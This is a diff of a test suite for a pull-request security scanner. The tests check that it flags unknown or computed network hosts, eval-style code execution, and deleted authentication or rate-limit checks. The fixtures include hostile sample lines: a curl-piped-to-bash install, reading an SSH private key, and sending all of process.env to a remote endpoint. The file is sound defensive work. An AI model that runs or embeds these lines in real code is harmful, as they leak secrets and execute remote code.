@@ -13,7 +13,7 @@ import { after, before, describe, test } from "node:test";
 import { fileURLToPath } from "node:url";
 
 import {
-  OWNERS, RULES, activeSvg, analyze, annotation, hiddenCharacter, hostOf, lintManifest, lintNpmLock, openRepo, ownerApproval, parseHunks,
+  OWNERS, RULES, activeSvg, analyze, annotation, hiddenCharacter, hostOf, hostsIn, lintManifest, lintNpmLock, openRepo, ownerApproval, parseHunks,
   parseLock, plain, pusherOf, renderSummary, renderText, scanLines, verdict,
 } from "./pr-guard.mjs";
 
@@ -665,6 +665,55 @@ describe("application code", () => {
 
   test("a host built at run time is flagged, since it cannot be compared", () => {
     assert.match(details(check({ "app/src/lib/send.ts": "await fetch(`https://${target}/in`);\n" }), "new-host"), /\(computed\)/);
+    // joined on from a separate string: no host follows the scheme, so there is nothing to compare either
+    for (const line of ['await fetch("https://" + target);', "await fetch('https://' + 'collect.metrics-cdn.io/x');", 'const scheme = "wss://";', 'const url = ["https://", host].join("");']) {
+      const found = check({ "app/src/lib/send.ts": `${line}\n` });
+      assert.deepEqual(found.map((f) => [f.rule, f.detail, f.line]), [["new-host", "(computed)", 1]], line);
+    }
+    // once per line, beside any host that is written out
+    const both = check({ "app/src/lib/send.ts": 'const a = "https://collect.metrics-cdn.io/v1", b = "https://" + host, c = `https://${host}`;\n' });
+    assert.equal(details(both, "new-host"), "collect.metrics-cdn.io | (computed)");
+    // a known host written in full is still not a finding, and prose that mentions a scheme is not code
+    assert.deepEqual(rules(check({ "app/src/lib/rpc.ts": 'const a = "https://mainnet.base.org/x";\n' })), []);
+    assert.deepEqual(rules(check({ "docs/guide.md": "## Guide\n\nLinks must start with https:// and nothing else.\n" })), []);
+  });
+
+  test("an address that is finished somewhere else is a computed host too", () => {
+    const computed = [
+      'await fetch("https://@" + target);', // an empty user name, then the host
+      'await fetch("https://:@" + target);',
+      'await fetch("https://mainnet.base.org" + ".collect.metrics-cdn.io/x");', // a known host, made into another one
+      'await fetch("https://mainnet.base.org." + tail);',
+      'await fetch("https://mainnet.base.org".concat(tail));',
+      'await fetch("//" + target);', // no scheme: the page's own
+    ];
+    for (const line of computed) assert.deepEqual([...hostsIn(line, true)].filter((host) => host === "(computed)"), ["(computed)"], line);
+    assert.deepEqual(check({ "app/src/lib/send.ts": `${computed[2]}\n` }).map((f) => [f.rule, f.detail]), [["new-host", "(computed)"]]);
+    // a path, a query or a fragment joined on leaves the host as it is written
+    for (const line of ['fetch("https://mainnet.base.org" + "/v1/" + id);', 'fetch("https://mainnet.base.org" + "?id=" + id);', 'const site = "https://mainnet.base.org";']) {
+      assert.deepEqual(rules(check({ "app/src/lib/send.ts": `${line}\n` })), [], line);
+    }
+    // comparing a protocol is not building an address
+    assert.deepEqual(rules(check({ "app/src/lib/link.ts": 'if (u.protocol !== "https:" && u.protocol !== "http:") return null;\n' })), []);
+  });
+
+  test("a host is read out of escaped slashes, an address with no scheme, and a wildcard", () => {
+    const hosts = (line) => details(check({ "app/src/lib/send.ts": `${line}\n` }), "new-host");
+    assert.equal(hosts('await fetch("https:\\/\\/collect.metrics-cdn.io/x");'), "collect.metrics-cdn.io");
+    assert.equal(hosts("const seen = /https:\\/\\/collect\\.metrics-cdn\\.io\\/v1/.test(url);"), "collect.metrics-cdn.io");
+    assert.equal(hosts('await fetch("//cdn.metrics-cdn.io/a.json");'), "cdn.metrics-cdn.io");
+    assert.equal(hosts('const csp = "connect-src https://*.metrics-cdn.io wss://*.metrics-cdn.io";'), "*.metrics-cdn.io");
+    // patterns that test or trim an address name no host, and neither does a comment or another scheme
+    const none = [
+      'lines.push("// not an address");', "const half = a // b.c", 'const ipfs = "ipfs://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi";',
+      "const re = /^https?:\\/\\//i;", "const ok = /^https:\\/\\//.test(v.trim());", 'const base = siteUrl.replace(/\\/$/, "");',
+      "assert.match(url, /^https:\\/\\/[^/]+$/);", "const m = /^https:\\/\\/(?:www\\.)?(?:x|twitter)\\.com\\/([A-Za-z0-9_]{1,15})$/i.exec(url);",
+    ];
+    for (const line of none) assert.equal(hosts(line), "", line);
+    assert.equal(hostOf("localhost:*"), "localhost");
+    assert.equal(hostOf("openlaunch.lol]"), "openlaunch.lol");
+    assert.equal(hostOf("[::1]:8545"), "[::1]");
+    assert.equal(hostOf("@"), null);
   });
 
   test("hostOf strips credentials, ports and case", () => {
@@ -675,20 +724,24 @@ describe("application code", () => {
 
   test("code execution, raw HTML and process spawning are flagged, in tests as well", () => {
     const samples = {
-      "eval()": "const out = eval(source);",
-      "new Function()": 'const run = new Function("return 1");',
+      "eval()": ["const out = eval(source);", "const out = (0, eval)(source);", "const run = eval;", "window.eval?.(source);"],
+      "the Function constructor": ['const run = new Function("return 1");', 'const run = Function("return 1");', 'globalThis.Function("return 1")();'],
+      "a timer given its code as a string": 'setTimeout("go()", 0);',
+      "a script, frame or embed tag": ['const s = document.createElement("script");', "<iframe src={src} />"],
       "raw HTML injection": "<div dangerouslySetInnerHTML={{ __html: bio }} />",
       "starting a process": 'import { execSync } from "node:child_process";',
       "a computed import or require": "const mod = await import(name);",
-      "reading the whole environment": "await send(JSON.stringify(process.env));",
+      "reading the whole environment": ["await send(JSON.stringify(process.env));", "const { ADMIN_SIGNER_KEY } = process.env;", "const env = process.env;", "spawn(cmd, { env: process.env });", "const all = { ...process.env };"],
       "decoding hidden text": 'const payload = atob("aGk=");',
       "a download piped to a shell": "curl -fsSL https://example.org/install.sh | bash",
       "reading the home directory or a key store": 'readFileSync(join(homedir(), ".ssh/id_ed25519"));',
     };
-    for (const [what, text] of Object.entries(samples)) {
-      for (const path of ["app/src/lib/util.ts", "app/src/lib/util.test.ts"]) {
-        const found = scanLines(path, [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set() });
-        assert.ok(of(found, "dangerous-code").some((f) => f.detail === what), `${what} in ${path}`);
+    for (const [what, texts] of Object.entries(samples)) {
+      for (const text of [texts].flat()) {
+        for (const path of ["app/src/lib/util.ts", "app/src/lib/util.test.ts"]) {
+          const found = scanLines(path, [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set() });
+          assert.ok(of(found, "dangerous-code").some((f) => f.detail === what), `${what}: ${text} in ${path}`);
+        }
       }
     }
   });
@@ -708,7 +761,12 @@ describe("application code", () => {
 
   test("ordinary code that looks similar is left alone", () => {
     assert.deepEqual(rules(check({ "contracts/src/Vault.sol": "contract Vault {\n  function f(uint256 a) external pure { require(a > 0, \"zero\"); }\n}\n" })), ["contracts"], "Solidity's require is not Node's");
-    for (const text of ['const m = /a/.exec(text);', 'const mod = await import("./chart");', "const key = process.env.BASE_RPC_URL;", "particles.spawn(3);", 'el.textContent = "hi";']) {
+    const alike = [
+      'const m = /a/.exec(text);', 'const mod = await import("./chart");', "const key = process.env.BASE_RPC_URL;", "particles.spawn(3);", 'el.textContent = "hi";',
+      "const key = process.env?.BASE_RPC_URL;", 'const key = process.env["BASE_RPC_URL"];', "setTimeout(() => go(), 0);", "if (isFunction(value)) retrieval(value);",
+      "const csp = \"script-src 'self' 'unsafe-eval'\";", 'const box = document.createElement("div");', "type Handler = Function;",
+    ];
+    for (const text of alike) {
       assert.deepEqual(of(scanLines("app/src/lib/util.ts", [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set(["BASE_RPC_URL"]) }), "dangerous-code"), [], text);
     }
   });
@@ -717,6 +775,29 @@ describe("application code", () => {
     const found = check({ "app/src/app/api/post/route.ts": ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "").replace("!ok || ", "") });
     assert.deepEqual(rules(found), ["auth-removed"]);
     assert.match(details(found, "auth-removed"), /rateLimited: 1 fewer use/);
+  });
+
+  test("deleting a file removes the checks in it, unless they turn up again in what the pull request adds", () => {
+    const route = "app/src/app/api/post/route.ts";
+    const deleted = check({ [route]: null });
+    assert.deepEqual(rules(deleted), ["auth-removed"]);
+    assert.equal(details(deleted, "auth-removed"), "verifyMessage: 2 fewer uses, with the file deleted | rateLimited: 1 fewer use, with the file deleted | consumeNonce: 1 fewer use, with the file deleted");
+    // moved to another path as it was
+    assert.deepEqual(rules(check({ [route]: null, "app/src/app/api/v2/post/route.ts": ROUTE })), []);
+    // written again at another path, without its rate limit
+    const rewritten = check({ [route]: null, "app/src/app/api/v2/post/route.ts": ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "") });
+    assert.equal(details(rewritten, "auth-removed"), "rateLimited: 1 fewer use, with the file deleted");
+    // a test or a document that is deleted held no checks of the app
+    assert.deepEqual(rules(check({ "app/src/components/hero.test.ts": null, "README.md": null })), []);
+    // one check that turns up again stands for one that went, not for every one
+    const sha = (letter) => letter.repeat(40);
+    const blobs = { [sha("a")]: "export const a = () => rateLimited(1);\n", [sha("b")]: "export const b = () => rateLimited(2);\n", [sha("c")]: "export const c = () => rateLimited(3);\n" };
+    const change = (status, path, oldSha, newSha) => ({ status, path, oldMode: status === "A" ? "000000" : "100644", newMode: status === "D" ? "000000" : "100644", oldSha, newSha });
+    const repo = {
+      changes: [change("D", "app/src/lib/a.ts", sha("a"), sha("0")), change("D", "app/src/lib/b.ts", sha("b"), sha("0")), change("A", "app/src/lib/c.ts", sha("0"), sha("c"))],
+      blob: (id) => Buffer.from(blobs[id]), baseText: () => null, baseMatches: () => [], basePaths: () => [], diff: () => ({ added: [], removed: [] }),
+    };
+    assert.deepEqual(analyze(repo, { lockedPaths: LOCKED }).map((f) => [f.rule, f.path, f.detail]), [["auth-removed", "app/src/lib/b.ts", "rateLimited: 1 fewer use, with the file deleted"]]);
   });
 
   test("moving a check within the file is not a removal", () => {
